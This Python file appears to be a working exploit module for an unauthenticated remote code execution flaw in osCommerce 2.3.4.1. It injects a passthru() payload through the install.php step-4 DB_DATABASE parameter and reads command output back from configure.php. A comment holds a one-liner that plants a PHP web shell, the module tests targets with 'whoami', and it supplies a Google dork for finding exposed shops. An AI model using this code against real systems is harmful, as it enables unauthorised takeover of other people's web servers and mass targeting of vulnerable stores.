# Exploit Title: osCommerce 2.3.4.1 - Remote Code Execution (2)
# Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin
# Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php
# Notes: The RCE doesn't need to be authenticated
# Date: 26/06/2021
# Exploit Author: Bryan Leong <NobodyAtall>
# Vendor Homepage: https://www.oscommerce.com/
# Version: osCommerce 2.3.4
# Tested on: Windows

#echo "<?php echo shell_exec(\$_GET[\'e\'].\' 2>&1\'); ?>" > ../../shell.php

import requests
import sys
from .Exploit import Exploit

class osComerceExploit(Exploit):

	name="osComerceRCE"

	baseUrl = ""
	testVulnUrl = ""

	def defineVars(self,ip):
		self.baseUrl = "http://" + ip
		self.testVulnUrl = self.baseUrl + '/install/install.php'

	def defineVarsS(self,ip):
		self.baseUrl = "https://" + ip
		self.testVulnUrl = self.baseUrl + '/install/install.php'

	def rce(self, command):
		#targeting the finish step which is step 4
		targetUrl = self.baseUrl + '/install/install.php?step=4'

		payload = "');"
		payload += "passthru('" + command + "');"    # injecting system command here
		payload += "/*"

		#injecting parameter
		data = {
			'DIR_FS_DOCUMENT_ROOT': './',
			'DB_DATABASE' : payload
		}

		response = requests.post(targetUrl, data=data)

		if(response.status_code == 200):
			#print('[*] Successfully injected payload to config file')

			readCMDUrl = self.baseUrl + '/install/includes/configure.php'
			try:
				cmd = requests.get(readCMDUrl)
				commandRsl = cmd.text.split('\n')

				if(cmd.status_code == 200):
					print('[*] System Command Execution Completed')
					#removing the error message above
					#for i in range(2, len(commandRsl)):
						#print(commandRsl[i])
				else:
					return '[!] Configure.php not found'
			except:
				return 'nada'
		else:
			return '[!] Fail to inject payload'

	def test(self):
		#testing vulnerability accessing the directory
		try:
			test = requests.get(self.testVulnUrl,timeout=5)
		except:
			return False
		#checking the install directory still exist or able to access or not
		if(test.status_code == 200):
			print('[*] Install directory still available, the host likely vulnerable to the exploit.')

			#testing system command injection
			print('[*] Testing injecting system command to test vulnerability')
			cmd = 'whoami'

			print('User: ', end='')
			err = self.rce(cmd)

			if(err != None):
				print(err)
				return False
			else:
				return True

		else:
			print('[!] Install directory not found, the host is not vulnerable')
			return False

	def execute(self,ip):
		# try https and http
		self.defineVars(ip)
		resultado = self.test()
		if not resultado:
			self.defineVarsS(ip)
			resultado = self.test()

		return resultado

	def getGoogle(self):
		return "intext:\"Powered by osCommerce\" intext:\"Welcome Guest! Would you like to log yourself in?\""
